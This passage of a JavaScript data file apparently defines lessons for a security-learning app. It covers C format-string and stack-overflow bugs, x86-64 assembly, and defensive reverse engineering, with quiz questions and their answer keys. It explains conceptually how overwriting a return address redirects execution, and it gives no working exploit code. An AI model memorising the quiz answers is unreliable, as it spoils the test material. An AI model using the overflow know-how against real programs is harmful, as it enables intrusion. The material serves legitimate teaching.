          { t: 'mcq', q: 'Which line has a format string vulnerability?', opts: ['printf("%s", name);', 'printf(name);', 'puts(name);', 'fprintf(stderr, "%s\\n", name);'], a: 1, why: 'Passing user data as the format lets them supply %x / %n specifiers.' },
          { t: 'mcq', q: 'What does ASLR do?', opts: ['Encrypts memory', 'Randomizes where code, stack and heap are loaded each run', 'Marks the stack non-executable', 'Checks buffer sizes'], a: 1, why: 'Address Space Layout Randomization makes addresses unpredictable. NX is the non-executable one.' },
          { t: 'gen', g: 'cWrap' },
          { t: 'explain', q: 'Explain how a stack buffer overflow can lead to code execution, and two mitigations.', points: ['Input longer than a local buffer is copied with no bounds check', 'It overwrites the saved return address on the stack', 'When the function returns, execution jumps where the attacker chose', 'Mitigations: canaries, NX/DEP, ASLR, safe functions, memory-safe languages'] }
        ]
      }
    ]
  };

  var asm = {
    name: 'Assembly (x86-64)', tag: 'Computer org · RE',
    blurb: 'What the CPU actually runs. Registers, the stack, and reading disassembly: the foundation of reverse engineering and malware analysis.',
    lessons: [
      {
        id: 'asm-intro', title: 'Registers & basic instructions', min: 11, teaser: 'mov, add, sub, xor, and the 16 registers.',
        pre: ['c-pointers', 'cs-data'], links: ['asm-flow'],
        cards: [
          { t: 'read', h: 'Why learn assembly', body: '<p>Compilers turn C (and most languages) into machine code. Assembly is the human-readable form of it. You won\'t write big programs in it, but you\'ll <b>read</b> it to: analyze malware with no source code, understand exploits, debug crashes, and pass computer organization courses. Tools: <code>objdump -d -M intel</code>, gdb, and Ghidra (free, from the NSA).</p>' },
          { t: 'read', h: 'Registers', body: '<p>Registers are tiny storage slots inside the CPU. x86-64 has 16 general-purpose 64-bit registers: <code>rax rbx rcx rdx rsi rdi rbp rsp r8–r15</code>.</p><ul><li><code>rax</code>: return values.</li><li><code>rdi, rsi, rdx, rcx, r8, r9</code>: the first six function arguments on Linux (System V ABI).</li><li><code>rsp</code>: stack pointer (top of the stack). <code>rbp</code>: base of the current frame.</li><li><code>rip</code>: instruction pointer, the address of the next instruction. Controlling rip = controlling the program.</li></ul><p><code>eax</code> is the lower 32 bits of rax, <code>ax</code> the lower 16, <code>al</code> the lower 8.</p>', mem: 'rax = return. rdi, rsi = args 1, 2. rsp = stack top. rip = next instruction.' },
          { t: 'read', h: 'Instructions (Intel syntax)', body: code(['mov rax, 5        ; rax = 5', 'mov rbx, rax      ; rbx = rax', 'add rax, rbx      ; rax = rax + rbx', 'sub rax, 2        ; rax = rax - 2', 'imul rax, 3       ; rax = rax * 3', 'inc rcx / dec rcx ; +1 / -1', 'xor rax, rax      ; rax = 0 (fast zeroing)', 'mov rax, [rbx]    ; load 8 bytes FROM the address in rbx', 'lea rax, [rbx+8]  ; rax = rbx + 8 (address math, no memory read)']) + '<p>Intel syntax is <b>destination, source</b>. Square brackets mean "memory at this address," like * in C. (AT&amp;T syntax, gdb\'s default, flips the order and adds % and $; run <code>set disassembly-flavor intel</code> in gdb.)</p>' },
          { t: 'gen', g: 'asmTrace' }, { t: 'gen', g: 'asmTrace' }, { t: 'gen', g: 'asmTrace' },
          { t: 'mcq', q: 'What does <code>mov rax, [rbx]</code> do?', opts: ['Copies rbx into rax', 'Loads the value stored at the memory address held in rbx into rax', 'Swaps rax and rbx', 'Adds rbx to rax'], a: 1, why: 'Brackets dereference, like *rbx in C.' }
        ]
      },
      {
        id: 'asm-flow', title: 'Flags, compares, jumps & loops', min: 10, teaser: 'How if statements and loops look in machine code.',
        pre: ['asm-intro'], links: ['asm-stack'],
        cards: [
          { t: 'read', h: 'cmp + jump = if', body: code(['cmp rax, 10      ; compute rax - 10, set flags, discard result', 'jl  small        ; jump if rax < 10 (signed)', 'mov rbx, 1', 'jmp done', 'small:', 'mov rbx, 0', 'done:']) + '<p><code>cmp</code> and <code>test</code> set <b>flags</b> (zero flag ZF, sign flag SF, carry CF, overflow OF). Conditional jumps read them: <code>je/jz</code> equal, <code>jne/jnz</code> not equal, <code>jl/jg</code> less/greater (signed), <code>jb/ja</code> below/above (unsigned). <code>jmp</code> always jumps.</p>', mem: 'cmp sets flags; jXX reads them.' },
          { t: 'read', h: 'Loops', body: '<p>A loop is a jump backward. A counted loop usually looks like: set a counter, do the body, decrement, jump back if not zero. When reversing, spotting backward jumps is how you find loops.</p><p><b>Reverse engineering example</b>: a crackme compares your input to a stored value with <code>cmp</code> then <code>jne fail</code>. Seeing that branch shows exactly where a license or password check happens. Malware analysts use the same skill to find what condition makes a sample activate.</p>' },
          { t: 'gen', g: 'asmJump' }, { t: 'gen', g: 'asmJump' }, { t: 'gen', g: 'asmLoop' }, { t: 'gen', g: 'asmLoop' }
        ]
      },
      {
        id: 'asm-stack', title: 'The stack, calls & stack frames', min: 12, teaser: 'push, pop, call, ret, and where the return address lives.',
        pre: ['asm-flow'], links: ['c-vulns', 'ds-recursion'],
        cards: [
          { t: 'read', h: 'push, pop, call, ret', body: '<ul><li><code>push x</code>: rsp −= 8, then store x at [rsp]. The stack grows <b>down</b> toward lower addresses.</li><li><code>pop r</code>: load [rsp] into r, then rsp += 8.</li><li><code>call f</code>: push the return address (the next instruction), then jump to f.</li><li><code>ret</code>: pop the return address into rip.</li></ul><p>So <code>ret</code> blindly trusts whatever 8 bytes sit at the top of the stack.</p>' },
          { t: 'read', h: 'A stack frame', body: code(['f:', '    push rbp          ; save caller\'s frame base', '    mov  rbp, rsp     ; new frame starts here', '    sub  rsp, 32      ; room for locals (e.g. char buf[32])', '    ...', '    leave             ; mov rsp, rbp ; pop rbp', '    ret               ; pop return address into rip']) + '<p>Layout from the buffer upward: <b>buf[32] → saved rbp → return address</b>. Write 32 + 8 + 8 bytes into buf and the last 8 replace the return address. That\'s the C overflow lesson at the machine level. A stack canary sits between buf and saved rbp to detect it.</p>', mem: 'buf → saved rbp → return address. ret trusts the top of the stack.' },
          { t: 'gen', g: 'asmStack' }, { t: 'gen', g: 'asmStack' },
          { t: 'mcq', q: 'What does the ret instruction do?', opts: ['Returns rax to the caller only', 'Pops the top of the stack into rip and continues there', 'Clears the stack', 'Calls the next function'], a: 1, why: 'Whatever 8 bytes are at [rsp] become the next instruction address. Overwrite them and you redirect execution.' },
          { t: 'explain', q: 'Explain, at the assembly level, why overflowing a local buffer can hijack a program.', points: ['call pushes a return address onto the stack', 'Local buffers sit below the saved rbp and return address', 'Writing past the buffer overwrites the return address', 'ret pops it into rip, so execution goes where the attacker wrote'] }
        ]
      },
      {
        id: 'asm-re', title: 'Reverse engineering, defensively', min: 11, teaser: 'Reading compiled programs with objdump, gdb and Ghidra.',
        pre: ['asm-stack'], links: ['sp-malware', 'sp-indicators'],
        cards: [
          { t: 'read', h: 'The workflow', body: '<ol><li><b>Triage</b>: <code>file</code>, <code>strings</code>, hashes (look them up on VirusTotal), and imported functions. Imports like networking + registry + crypto calls hint at behavior.</li><li><b>Static analysis</b>: open it in Ghidra. Its decompiler turns assembly back into C-like code. Rename variables as you understand them.</li><li><b>Dynamic analysis</b>: run it in an <b>isolated VM</b> (snapshot first, no shared folders, host-only network) and watch processes, files and network traffic.</li><li><b>Write it up</b>: indicators of compromise (hashes, domains, file paths) for detection rules.</li></ol><p>Legal note: reverse engineering malware samples and your own or training binaries (crackmes, CTFs) is standard practice. Reversing commercial software can break its license terms.</p>' },
          { t: 'read', h: 'Practice that\'s free and legal', body: '<ul><li><b>crackmes.one</b>: small programs built to be reversed.</li><li><b>picoCTF</b> reverse-engineering problems (from Carnegie Mellon).</li><li><b>Compile your own C</b> with <code>gcc -O0 -g</code>, then read it with <code>objdump -d -M intel</code> and compare to the source. Then try <code>-O2</code> and see how the compiler rewrites it.</li><li>For your homelab: Ghidra and gdb run fine on your Kali VM. Analyze real malware only in a dedicated, isolated VM.</li></ul>' },
          { t: 'mcq', q: 'What\'s the safest place to run an unknown malware sample for dynamic analysis?', opts: ['Your main PC with antivirus on', 'An isolated VM with a snapshot, no shared folders, and a restricted network', 'Your domain-joined Windows 11 VM', 'A cloud server with your work credentials'], a: 1, why: 'Isolation plus snapshots lets you watch it safely and roll back. Never run it on anything with real data or domain access.' },
          { t: 'mcq', q: 'What does Ghidra\'s decompiler do?', opts: ['Runs the malware safely', 'Turns machine code back into approximate C-like code', 'Removes viruses', 'Compiles C'], a: 1, why: 'It\'s an approximation (names and types are lost), but it makes large binaries readable.' },
          { t: 'gen', g: 'asmJump' },
          { t: 'explain', q: 'Describe a safe, step-by-step process for analyzing a suspicious executable.', points: ['Triage: file type, strings, hashes, imports', 'Static analysis in Ghidra or a disassembler', 'Dynamic analysis in an isolated VM with snapshots', 'Document IOCs for detection rules'] }
        ]
      }
    ]
  };

  S.units.push(java, c, asm);
})();
